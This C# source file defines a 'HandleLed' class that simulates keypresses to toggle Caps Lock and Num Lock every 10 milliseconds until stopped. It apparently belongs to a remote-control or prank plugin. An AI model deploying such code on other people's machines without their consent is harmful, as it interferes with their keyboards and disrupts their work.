using System;
using System.Threading;

namespace Plugin.Handler;

internal class HandleLed
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			while (!ctsStop.IsCancellationRequested)
			{
				ToggleCapsLock();
				Thread.Sleep(10);
				ToggleNumLock();
				Thread.Sleep(10);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}

	private static void ToggleCapsLock()
	{
		Native.keybd_event(20, 69, 1u, UIntPtr.Zero);
		Native.keybd_event(20, 69, 3u, UIntPtr.Zero);
	}

	private static void ToggleNumLock()
	{
		Native.keybd_event(144, 69, 1u, UIntPtr.Zero);
		Native.keybd_event(144, 69, 3u, UIntPtr.Zero);
	}
}
